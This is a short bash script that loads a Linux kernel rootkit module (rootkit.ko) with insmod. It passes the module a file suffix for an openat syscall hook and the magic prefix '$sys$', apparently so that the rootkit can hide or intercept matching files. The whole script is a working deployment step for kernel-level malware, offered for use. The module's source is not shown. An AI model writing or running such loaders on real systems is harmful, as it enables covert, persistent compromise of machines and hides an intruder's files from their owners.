#!/bin/bash

# Specify the extension suffix for the openat hook code
SUFFIX=.txt
MAGIC_PREFIX='$sys$'

#Insert the rootkit module, providing some parameters
insmod rootkit.ko suffix=$SUFFIX magic_prefix=$MAGIC_PREFIX